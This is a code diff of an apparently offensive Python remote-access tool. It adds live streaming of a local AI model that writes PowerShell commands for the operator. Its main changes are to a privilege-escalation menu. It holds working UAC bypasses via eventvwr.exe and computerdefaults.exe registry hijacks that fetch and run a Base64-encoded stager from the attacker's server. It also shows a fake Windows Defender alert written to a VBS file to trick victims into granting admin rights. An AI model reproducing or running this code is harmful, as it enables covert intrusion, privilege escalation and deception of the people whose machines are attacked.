@@ -114,9 +114,41 @@ def ask_ai(prompt, max_tokens=500):
                 "stream": False,
                 "options": {"num_predict": max_tokens, "temperature": 0.3}
             },
-            timeout=120
+            timeout=180
         )
         return response.json().get("response", "").strip()
+    except Exception as e:
+        return f"[AI ERROR: {e}]"
+
+def ask_ai_streaming(prompt, max_tokens=500):
+    """Query DeepSeek Coder with LIVE streaming output."""
+    full_response = ""
+    try:
+        response = requests.post(
+            "http://localhost:11434/api/generate",
+            json={
+                "model": "deepseek-coder:6.7b",
+                "prompt": prompt,
+                "stream": True,
+                "options": {"num_predict": max_tokens, "temperature": 0.3}
+            },
+            stream=True,
+            timeout=300
+        )
+        console.print("[bold magenta]💭 AI Thinking (live):[/]")
+        for line in response.iter_lines():
+            if line:
+                try:
+                    data = json.loads(line)
+                    token = data.get("response", "")
+                    full_response += token
+                    print(token, end="", flush=True)
+                    if data.get("done"):
+                        break
+                except Exception:
+                    pass
+        print()
+        return full_response.strip()
     except Exception as e:
         return f"[AI ERROR: {e}]"
 
@@ -235,13 +267,13 @@ Generate ONLY the PowerShell command to accomplish this task.
 POWERSHELL COMMAND:"""
             
             # Show the prompt being sent
-            console.print(Panel(f"[dim]Asking AI:[/] {user_request}", title="🧠 AI Thinking", border_style="blue"))
-            console.print("[dim]Waiting for DeepSeek response (10-30s on CPU)...[/]")
+            print()
+            console.print(Panel(f"[bold]Your request:[/] {user_request}", title="🧠 Understanding Request", border_style="blue"))
+            print()
             
-            ai_response = ask_ai(prompt, max_tokens=200)
-            
-            # Show raw AI response
-            console.print(Panel(ai_response, title="💭 AI Raw Response", border_style="magenta"))
+            # USE STREAMING for live token display
+            ai_response = ask_ai_streaming(prompt, max_tokens=300)
+            print()
             
             # Parse command
             command = ai_response.strip().split("\n")[0]
@@ -1215,34 +1247,48 @@ def menu_privesc():
             input("\n[Enter to continue]")
         elif choice == "2":
             # eventvwr.exe UAC bypass - stealthier than fodhelper
+            # Use Base64 encoded command to avoid issues
             ip = CFG.get_ip()
-            port = CFG.listener_port
-            cmd = f'''$c="powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{CFG.http_port}/s')";New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process eventvwr.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force'''
+            ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
+            import base64
+            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
+            
+            cmd = f'''$c="powershell -w hidden -enc {encoded_cmd}";New-Item -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\mscfile\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process eventvwr.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\mscfile" -Recurse -Force'''
             console.print("[cyan]Attempting eventvwr UAC bypass...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
-            # Wait for new elevated shell
             SHELL.wait_for_new_shell(timeout=15)
             input("\n[Enter to continue]")
         elif choice == "3":
-            # computerdefaults.exe bypass
+            # computerdefaults.exe bypass - Use Base64 encoded command
             ip = CFG.get_ip()
-            port = CFG.listener_port
-            cmd = f'''$c="powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{CFG.http_port}/s')";New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process computerdefaults.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force'''
+            ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
+            import base64
+            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
+            
+            cmd = f'''$c="powershell -w hidden -enc {encoded_cmd}";New-Item -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Force | Out-Null;New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command" -Name "(default)" -Value $c -Force;Start-Process computerdefaults.exe;Start-Sleep 2;Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force'''
             console.print("[cyan]Attempting computerdefaults UAC bypass...[/]")
             result = SHELL.execute(cmd)
             console.print(f"[green]{result}[/]")
-            # Wait for new elevated shell
             SHELL.wait_for_new_shell(timeout=15)
             input("\n[Enter to continue]")
         elif choice == "4":
             # Create VBS that shows fake Defender dialog, then requests admin
+            # Use Base64 encoded command to avoid quote escaping issues
             ip = CFG.get_ip()
             port = CFG.listener_port
+            
+            # Build a simple PowerShell command that downloads and runs /s
+            ps_cmd = f"IEX(IWR http://{ip}:{CFG.http_port}/s -UseBasic).Content"
+            
+            # Base64 encode it for clean passing through VBS
+            import base64
+            encoded_cmd = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
+            
             vbs_cmd = f'''$v=@"
 Set objShell = CreateObject("WScript.Shell")
 MsgBox "Windows Defender requires elevated permissions to complete a security scan." & vbCrLf & vbCrLf & "Click OK to authorize.", vbExclamation, "Windows Defender - Security Alert"
-objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -c IEX(New-Object Net.WebClient).DownloadString(''http://{ip}:{CFG.http_port}/s'')'", 0, False
+objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -ep bypass -enc {encoded_cmd}'", 0, False
 "@;$v|Out-File "$env:TEMP\\defender.vbs" -Encoding ASCII;Start-Process wscript -ArgumentList "$env:TEMP\\defender.vbs"'''
             console.print("[cyan]Showing fake Defender dialog + UAC prompt...[/]")
             result = SHELL.execute(vbs_cmd)
